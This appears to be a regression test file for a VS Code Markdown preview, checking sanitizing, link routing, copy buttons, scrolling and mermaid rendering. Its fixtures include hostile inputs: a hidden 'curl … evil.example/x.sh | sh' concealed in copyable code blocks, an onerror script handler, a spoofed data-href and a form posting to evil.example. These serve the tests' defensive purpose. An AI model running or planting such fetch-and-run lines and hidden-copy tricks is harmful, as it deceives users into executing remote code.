// Regression tests for fixed 0.1.x Markdown preview bugs: task toggles (the only 0.1.x edit), block updates,
// sanitizing, links, copy buttons, in-page jumps, scroll restore, mermaid, large documents.
'use strict';
const assert = require('node:assert/strict');
const H = require('./harness');

const filler = (n, tag) => Array.from({ length: n }, (_, i) => `${tag} filler paragraph ${i}.`).join('\n\n');

/** One document with an item per fixed finding (from the fix-E hunt). */
const REGRESSIONS = [
  '# Regressions',
  '',
  'Text with a note[^1] and [a link](https://example.com).',
  '',
  'The attribute data-line="1" is set here.',
  '',
  '<style>.md-view { background: rgb(255, 0, 0) !important; } .md-article h1 { display: none; }</style>',
  '',
  '<form action="https://evil.example/f"><button id="fbtn">go</button></form>',
  '',
  '<map name="m"><area shape="rect" coords="0,0,50,50" href="https://area.example/"></map>',
  '<img usemap="#user-content-m" src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" width="50" height="50" id="mapimg">',
  '',
  '<div data-vscode-context=\'{"preventDefaultContextMenuItems": true}\'>context</div>',
  '',
  '<a id="spoof" href="https://real.example/" data-href="vscode:extension/x">spoofed data-href</a>',
  '<a id="spoof2" href="https://real.example/2" data-href="other.md">spoofed relative data-href</a>',
  '',
  '```js',
  'const a = 1;',
  '```',
  '',
  '- [ ] one',
  '- [ ] two',
  '- [ ] three',
  '',
  '1. first',
  '   1. nested',
  '      1. deeper',
  '',
  '<ol type="A"><li>upper<ol type="a"><li>typed</li></ol></li></ol>',
  '',
  filler(40, 'Middle'),
  '',
  '[^1]: The footnote. [inner](https://example.org)',
  '',
].join('\n');

const regressions = () => H.markdownHost('regressions.md', REGRESSIONS);
const version = (view) => view.eval(() => Number(document.querySelector('.md-article').dataset.version));
const waitVersion = (view, v) => view.page.waitForFunction((v) => Number(document.querySelector('.md-article')?.dataset.version) >= v, { timeout: 8000, polling: 20 }, v);
/** navigator.clipboard.writeText stub: every write lands in window.__clip. */
const clipStub = () => {
  window.__clip = [];
  Object.defineProperty(navigator, 'clipboard', { configurable: true, value: { writeText: async (t) => void window.__clip.push(t) } });
};

H.suite('markdown preview (0.1.x regressions)', ({ test }) => {
  test('H6-F6 a refused toggle (stale version) puts the checkbox back to the file state at once', (h) =>
    h.use(H.markdownHost('tasks.md', '# Tasks\n\n- [ ] plain\n- [ ] other\n\nLast paragraph.\n'), {}, async (view) => {
      const host = view.host;
      // The file changed in the text editor; the webview has not got the update yet: its click carries the old version.
      host.text = host.text.replace('Last paragraph.', 'Last paragraph, edited.');
      host.version++;
      await view.eval(() => document.querySelector('input.task-list-item-checkbox[data-line="2"]').click());
      await view.page.waitForFunction(() => !document.querySelector('input.task-list-item-checkbox[data-line="2"]').checked, { timeout: 3000, polling: 20 }).catch(() => {});
      assert.equal(await view.eval(() => document.querySelector('input.task-list-item-checkbox[data-line="2"]').checked), false, 'checkbox back to [ ]');
      const results = await view.eval(() => window.__received.filter((m) => m.type === 'toggleTaskResult').map((m) => m.applied));
      assert.deepEqual(results, [false]);
      assert.match(host.text.split('\n')[2], /^- \[ \] plain/, 'the file is unchanged');
      // The next update and click work normally.
      await view.push(host.update());
      await waitVersion(view, 2);
      await view.eval(() => document.querySelector('input.task-list-item-checkbox[data-line="2"]').click());
      await waitVersion(view, 3);
      assert.match(host.text.split('\n')[2], /^- \[x\] plain/);
      assert.equal(await view.eval(() => document.querySelector('input.task-list-item-checkbox[data-line="2"]').checked), true);
    }));

  test('H6-F5 / H9-F7 Space on a task keeps keyboard focus through the update; Tab + Space toggles the next task', (h) =>
    h.use(regressions(), {}, async (view) => {
      const host = view.host;
      const line = (label) => host.text.split('\n').findIndex((l) => l.endsWith(label));
      await view.page.focus(`input.task-list-item-checkbox[data-line="${line('one')}"]`);
      const v0 = await version(view);
      await view.page.keyboard.press('Space');
      await waitVersion(view, v0 + 1);
      await H.sleep(100);
      assert.equal(await view.eval(() => document.activeElement.getAttribute('data-line')), String(line('one')));
      await view.page.keyboard.press('Tab');
      await view.page.keyboard.press('Space');
      await waitVersion(view, v0 + 2);
      const src = host.text.split('\n');
      assert.deepEqual([src[line('one')], src[line('two')], src[line('three')]], ['- [x] one', '- [x] two', '- [ ] three']);
    }));

  test('H6-F3 text that contains data-line="…" is diffed as content: editing it updates the preview', (h) =>
    h.use(regressions(), {}, async (view) => {
      const host = view.host;
      host.text = host.text.replace('data-line="1"', 'data-line="2"');
      host.version++;
      await view.push(host.update());
      await waitVersion(view, host.version);
      const p = await view.eval(() => [...document.querySelectorAll('.md-article p')].map((x) => x.textContent).find((t) => t.includes('The attribute')));
      assert.match(p, /data-line="2"/);
    }));

  test('H6-F2 / H8-F2 / H8-F4 raw <style>, <form>, image maps and data-vscode-* attributes are removed', (h) =>
    h.use(regressions(), {}, async (view) => {
      const san = await view.eval(() => {
        const art = document.querySelector('.md-article');
        return {
          style: art.querySelectorAll('style').length,
          form: art.querySelectorAll('form').length,
          map: art.querySelectorAll('map, area').length,
          ctx: document.querySelectorAll('[data-vscode-context]').length,
          viewBg: getComputedStyle(document.querySelector('.md-view')).backgroundColor,
          h1: getComputedStyle(art.querySelector('h1')).display,
        };
      });
      assert.deepEqual([san.style, san.form, san.map, san.ctx], [0, 0, 0, 0], JSON.stringify(san));
      assert.notEqual(san.viewBg, 'rgb(255, 0, 0)');
      assert.notEqual(san.h1, 'none');
    }));

  test("H8-F1 a link opens the href it shows (spoofed data-href ignored), once, never through VS Code's own handler", (h) =>
    h.use(regressions(), {}, async (view) => {
      await view.eval(() => {
        window.__vsClicks = [];
        window.addEventListener('click', (e) => {
          for (const n of e.composedPath()) if (n.tagName && n.tagName.toLowerCase() === 'a' && n.href) return void window.__vsClicks.push(String(n.href));
        });
      });
      await view.clearPosted();
      await view.page.click('#user-content-spoof');
      await view.page.click('#user-content-spoof2');
      await view.page.click('.md-article a[href="https://example.com"]');
      await H.sleep(100);
      assert.deepEqual((await view.posted('openLink')).map((m) => m.href), ['https://real.example/', 'https://real.example/2', 'https://example.com']);
      assert.deepEqual(await view.eval(() => window.__vsClicks), []);
    }));

  test('H8-F6 an image-map <area> (even one that got past the sanitizer) is routed to openLink; the webview never navigates', (h) =>
    h.use(H.markdownHost('area.md', '# Area\n\ntext\n'), {}, async (view) => {
      const p = view.page;
      const start = p.url();
      await view.eval(() => {
        const div = document.createElement('div');
        div.innerHTML = '<map name="injected"><area shape="rect" coords="0,0,60,60" href="https://inj.example/"></map><img id="injimg" usemap="#injected" src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" width="60" height="60">';
        document.querySelector('.md-article').prepend(div);
      });
      await p.setRequestInterception(true);
      p.on('request', (req) => (req.url().startsWith('https://inj.example') ? req.respond({ status: 200, contentType: 'text/html', body: 'navigated' }) : req.continue()));
      await view.clearPosted();
      await p.click('#injimg');
      await H.sleep(500);
      assert.equal(p.url(), start);
      assert.deepEqual((await view.posted('openLink')).map((m) => m.href), ['https://inj.example/']);
    }));

  test('H6-F4 the code-block "Copy" label is not page text (not in a selection or find-in-page)', (h) =>
    h.use(regressions(), {}, async (view) => {
      const sel = await view.eval(() => {
        const s = getSelection();
        s.removeAllRanges();
        const range = document.createRange();
        range.selectNodeContents(document.querySelector('.md-article'));
        s.addRange(range);
        const text = s.toString();
        s.removeAllRanges();
        return text;
      });
      assert.ok(sel.includes('const a = 1;'));
      assert.doesNotMatch(sel, /\bCopy\b/);
      // The label is drawn by CSS only: no DOM text that a copy or find-in-page could pick up.
      const label = await view.eval(() => {
        const texts = [...document.querySelectorAll('.md-copy-button')].map((b) => b.textContent);
        getSelection().removeAllRanges();
        const found = window.find('Copy', true, false, true);
        getSelection().removeAllRanges();
        return { texts, found };
      });
      assert.ok(label.texts.length >= 1, 'the code block has a copy button');
      assert.deepEqual(label.texts, label.texts.map(() => ''), 'the button has no text content');
      assert.equal(label.found, false, 'find-in-page does not find the "Copy" label');
    }));

  test('H9-F6 the copy result is announced (button name + live region)', (h) =>
    h.use(regressions(), {}, async (view) => {
      await view.eval(clipStub);
      await view.page.hover('.md-article .md-code-block');
      await H.sleep(200);
      await view.page.click('.md-article .md-copy-button');
      await H.sleep(250);
      const a11y = await view.eval(() => ({ name: document.querySelector('.md-article .md-copy-button').getAttribute('aria-label'), status: (document.querySelector('.md-view [role="status"]') || {}).textContent || '', clip: window.__clip }));
      assert.equal(a11y.name, 'Copied');
      assert.match(a11y.status, /copied/i);
      assert.deepEqual(a11y.clip, ['const a = 1;']);
    }));

  test('H9-F13 the code-block copy button is opaque in Dark Modern (not transparent over the code)', (h) =>
    h.use(regressions(), { theme: 'dark' }, async (view) => {
      await view.page.hover('.md-article .md-code-block');
      await H.sleep(300);
      const bg = await view.eval(() => getComputedStyle(document.querySelector('.md-article .md-copy-button')).backgroundColor);
      const m = /rgba?\(([^)]+)\)/.exec(bg);
      const alpha = m ? (m[1].split(/[\s,/]+/).filter(Boolean).map(Number)[3] ?? 1) : 0;
      assert.ok(alpha >= 0.99, `background ${bg}`);
    }));

  test('H6-F15 nested ordered lists use decimal / lower-roman / lower-alpha (GitHub); type="…" wins', (h) =>
    h.use(regressions(), {}, async (view) => {
      const lists = await view.eval(() => [...document.querySelectorAll('.md-article ol')].filter((o) => !o.closest('.footnotes')).map((o) => getComputedStyle(o).listStyleType));
      assert.deepEqual(lists, ['decimal', 'lower-roman', 'lower-alpha', 'upper-alpha', 'lower-alpha']);
    }));

  test('H6-F16 / H9-F5 Enter on a footnote reference moves the focus to the target; Tab continues there', (h) =>
    h.use(regressions(), {}, async (view) => {
      await view.page.focus('.md-article sup a');
      await view.page.keyboard.press('Enter');
      await H.sleep(200);
      const jumped = await view.eval(() => ({ active: document.activeElement.id || document.activeElement.tagName, top: document.querySelector('.md-view').scrollTop }));
      await view.page.keyboard.press('Tab');
      await H.sleep(100);
      const after = await view.eval(() => ({ text: document.activeElement.textContent, top: document.querySelector('.md-view').scrollTop }));
      assert.match(jumped.active, /fn1/);
      assert.equal(after.text, 'inner');
      assert.ok(Math.abs(after.top - jumped.top) < 300, JSON.stringify({ jumped, after }));
    }));

  test('R2H3-A a code-block Copy copies exactly the code shown; a copy button written in the document is inert', async (h) => {
    const hidden = '# Copy\n\n<pre><code>npm install left-pad<span style="display:none"> &amp;&amp; curl -s https://evil.example/x.sh | sh</span></code></pre>\n\n```sh\nnpm install left-pad\n```\n';
    const fake = '# Fake\n\n<div class="md-code-block"><pre style="display:none"><code>curl -s https://evil.example/x.sh | sh</code></pre><pre><code>npm install left-pad</code></pre><button class="md-copy-button" type="button" data-label="Copy" aria-label="Copy code" title="Copy code"></button></div>\n';
    const clickAll = async (view) => {
      const out = [];
      for (const b of await view.page.$$('.md-copy-button')) {
        await b.evaluate((x) => x.scrollIntoView({ block: 'center' }));
        await b.click();
        await H.sleep(150);
        out.push(await b.evaluate((x) => ({ shown: (x.parentElement.querySelector('pre > code') || { innerText: '' }).innerText.replace(/\n$/, ''), clip: window.__clip.at(-1) })));
      }
      return out;
    };
    await h.use(H.markdownHost('copy-hidden.md', hidden), {}, async (view) => {
      await view.eval(clipStub);
      const res = await clickAll(view);
      assert.equal(res.length, 2);
      assert.ok(res.every((r) => r.clip === r.shown), JSON.stringify(res));
    });
    await h.use(H.markdownHost('copy-fake.md', fake), {}, async (view) => {
      await view.eval(clipStub);
      const btn = await view.page.$('.md-article button:not(.md-copy-button)');
      assert.ok(btn, 'the fake button is shown as a plain button');
      await btn.click();
      await H.sleep(150);
      assert.deepEqual(await view.eval(() => window.__clip.slice()), [], 'the fake button copies nothing');
      const res = await clickAll(view);
      assert.ok(res.every((r) => r.clip === r.shown), JSON.stringify(res));
    });
  });

  test('R2H3-E a jump to an empty <a name> anchor highlights the block it marks; Tab continues after it', (h) =>
    h.use(
      H.markdownHost('anchors.md', `# Anchors\n\n[to install](#setup-anchor) and [to heading](#usage)\n\n${filler(60, 'Top')}\n\n<a name="setup-anchor"></a>\n\n## Install\n\n[link after install](https://ok.example/after-install)\n\n## Usage\n\n[link after usage](https://ok.example/after-usage)\n\n${filler(40, 'Tail')}\n`),
      { height: 500 },
      async (view) => {
        await view.eval(() => [...document.querySelectorAll('.md-article a')].find((a) => a.textContent === 'to install').focus());
        await view.page.keyboard.press('Enter');
        await H.sleep(300);
        const flash = await view.eval(() => {
          const f = document.querySelector('.md-target-flash');
          const r = f && f.getBoundingClientRect();
          return { w: r ? Math.round(r.width) : 0, h: r ? Math.round(r.height) : 0 };
        });
        await view.page.keyboard.press('Tab');
        await H.sleep(100);
        assert.ok(flash.w > 0 && flash.h > 0, `highlight ${JSON.stringify(flash)}`);
        assert.equal(await view.eval(() => document.activeElement.textContent.slice(0, 40)), 'link after install');
      },
    ));

  test('D2-MD-SCROLL the scroll position survives a reload 50 ms after scrolling (state save flushed)', (h) =>
    h.use(H.markdownHost('scroll.md', `# Scroll\n\n${filler(120, 'Scroll')}\n`), { height: 500 }, async (view) => {
      const target = await view.eval(() => {
        const v = document.querySelector('.md-view');
        v.scrollTop = Math.min(900, v.scrollHeight - v.clientHeight - 10);
        return v.scrollTop;
      });
      await H.sleep(50);
      await view.reload();
      await H.sleep(800);
      const restored = await view.eval(() => document.querySelector('.md-view').scrollTop);
      assert.ok(target > 100 && Math.abs(restored - target) < 40, JSON.stringify({ target, restored }));
    }));

  test('R3-017 arrows still scroll the preview after the focus went to <body> (focus back from the workbench)', (h) =>
    h.use(H.markdownHost('keys.md', `# Keys\n\n${filler(80, 'Keys')}\n`), { height: 500 }, async (view) => {
      await view.eval(() => {
        if (document.activeElement && document.activeElement !== document.body) document.activeElement.blur();
        window.dispatchEvent(new Event('focus'));
      });
      const before = await view.eval(() => document.querySelector('.md-view').scrollTop);
      await view.page.keyboard.press('ArrowDown');
      await view.page.keyboard.press('ArrowDown');
      await view.page.keyboard.press('PageDown');
      await H.sleep(400);
      const after = await view.eval(() => document.querySelector('.md-view').scrollTop);
      assert.ok(after > before + 50, `scrollTop ${before} -> ${after}`);
    }));

  test('K11 an off-screen diagram is an empty sized placeholder (its source is not page text)', (h) =>
    h.use(H.markdownHost('far-diagram.md', `# Diagrams\n\n${filler(80, 'Before')}\n\n\`\`\`mermaid\nflowchart TD\n  far1[Far one] --> far2[Far two]\n\`\`\`\n`), {}, async (view) => {
      const ph = await view.eval(() => {
        const far = [...document.querySelectorAll('.md-article .mermaid')].pop();
        return { pending: far.classList.contains('md-mermaid-pending'), text: far.textContent, height: far.getBoundingClientRect().height, found: window.find('Far two'), source: (far.dataset.mermaidSource || '').includes('Far two') };
      });
      assert.deepEqual(ph, { pending: true, text: '', height: ph.height, found: false, source: true });
      assert.ok(ph.height >= 120, `placeholder height ${ph.height}`);
    }));

  test('OBS-MERMAID-IDS two identical diagrams get unique element ids and keep their own url(#…) targets', (h) =>
    h.use(H.markdownHost('twins.md', '# Two identical diagrams\n\n```mermaid\ngraph TD; A-->B\n```\n\nText between the diagrams.\n\n```mermaid\ngraph TD; A-->B\n```\n'), {}, async (view) => {
      await view.page.waitForFunction(() => document.querySelectorAll('.mermaid svg').length === 2 && !document.querySelector('.md-mermaid-pending'), { timeout: 30000, polling: 100 });
      const r = await view.eval(() => {
        const ids = [...document.querySelectorAll('[id]')].map((e) => e.id);
        const foreign = [];
        for (const svg of document.querySelectorAll('.mermaid svg')) {
          for (const el of svg.querySelectorAll('*')) {
            for (const attr of el.attributes) {
              for (const m of attr.value.matchAll(/url\(#([^)]+)\)/g)) {
                const target = document.getElementById(m[1]);
                if (!target || !svg.contains(target)) foreign.push(`${attr.name}=${attr.value}`);
              }
            }
          }
        }
        return { dup: [...new Set(ids.filter((id, i) => ids.indexOf(id) !== i))].slice(0, 5), foreign: foreign.slice(0, 5) };
      });
      assert.deepEqual(r, { dup: [], foreign: [] });
    }), { timeout: 120000 });

  test('K10 a large document (built in parts): an edit right after opening applies; every block arrives once, sanitized', (h) => {
    const big = Array.from({ length: 4000 }, (_, i) => `Paragraph ${i} lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor.`).join('\n\n');
    const src = `# Big\n\n${big}\n\n<style>.md-view { background: rgb(255, 0, 0) !important; }</style>\n\n<img src="data:image/png;base64,AAAA" onerror="window.__pwn = 1">\n\nThe very last paragraph.\n`;
    return h.use(H.markdownHost('big.md', src), {}, async (view) => {
      const host = view.host;
      host.text = host.text.replace('Paragraph 0 lorem', 'Inserted at the top.\n\nParagraph 0 lorem');
      host.version++;
      await view.push(host.update());
      await waitVersion(view, 2);
      assert.ok(await view.eval(() => document.querySelector('.md-article').textContent.includes('Inserted at the top.')));
      await view.page.waitForFunction(() => document.querySelector('.md-article').textContent.includes('The very last paragraph.'), { timeout: 30000, polling: 100 });
      const done = await view.eval(() => {
        const art = document.querySelector('.md-article');
        return { paragraphs: art.querySelectorAll('p').length, style: art.querySelectorAll('style').length, onerror: art.querySelectorAll('[onerror]').length, pwn: window.__pwn || 0, bg: getComputedStyle(document.querySelector('.md-view')).backgroundColor };
      });
      const expected = (host.update().html.match(/<p[ >]/g) || []).length; // every block arrives once
      assert.equal(done.paragraphs, expected, JSON.stringify(done));
      assert.deepEqual([done.style, done.onerror, done.pwn], [0, 0, 0]);
      assert.notEqual(done.bg, 'rgb(255, 0, 0)');
    });
  }, { timeout: 120000 });

  test('R2H3-B a large document reopens at the same block after a reload', (h) => {
    const sections = Array.from({ length: 1500 }, (_, i) => `## Section ${i + 1}\n\nParagraph of section ${i + 1} with marker word zq${i + 1}zq and some filler text to make the block longer than a line or two in the preview.`).join('\n\n');
    return h.use(H.markdownHost('big-sections.md', `# Big document\n\n${sections}\n`), {}, async (view) => {
      await view.page.waitForFunction(() => document.querySelectorAll('.md-article h2').length >= 1500, { timeout: 30000, polling: 200 });
      await view.eval(() => (document.querySelector('.md-view').scrollTop = 60000));
      await H.sleep(800);
      const topBlock = () =>
        view.eval(() => {
          const vt = document.querySelector('.md-view').getBoundingClientRect().top;
          const first = [...document.querySelector('.md-article').children].find((k) => k.getBoundingClientRect().bottom > vt + 1);
          return { line: first ? first.getAttribute('data-source-line') : null, offset: first ? Math.round(first.getBoundingClientRect().top - vt) : null };
        });
      const before = await topBlock();
      await view.reload();
      await H.sleep(2000);
      const after = await topBlock();
      assert.ok(before.line !== null && after.line === before.line && Math.abs(after.offset - before.offset) <= 2, JSON.stringify({ before, after }));
    });
  }, { timeout: 120000 });
});
